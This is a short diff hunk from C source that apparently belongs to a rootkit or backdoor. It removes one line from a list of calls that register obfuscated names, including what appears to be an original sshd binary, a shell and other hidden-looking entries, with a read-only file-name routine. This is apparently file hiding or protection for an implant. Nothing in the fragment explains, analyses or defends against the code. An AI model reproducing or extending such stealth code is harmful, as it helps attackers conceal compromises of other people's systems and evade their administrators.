@@ -802,7 +802,6 @@ cont:
     fs_add_name_ro(kv_whatever_getstr(_OBF__O4UDK, sizeof(_OBF__O4UDK)));
     fs_add_name_ro(kv_whatever_getstr(_OBF__LM_SH, sizeof(_OBF__LM_SH)));
     fs_add_name_ro(kv_whatever_getstr(_OBF__SSHD_ORIG, sizeof(_OBF__SSHD_ORIG)));
-    fs_add_name_ro(kv_whatever_getstr(_OBF__LJD3P, sizeof(_OBF__LJD3P)));
     fs_add_name_ro(kv_whatever_getstr(_OBF__STFU, sizeof(_OBF__STFU)));
     fs_add_name_ro(kv_whatever_getstr(_OBF_WHITENOSE, sizeof(_OBF_WHITENOSE)));
     fs_add_name_ro(kv_whatever_getstr(_OBF_PINKNOSE, sizeof(_OBF_PINKNOSE)));
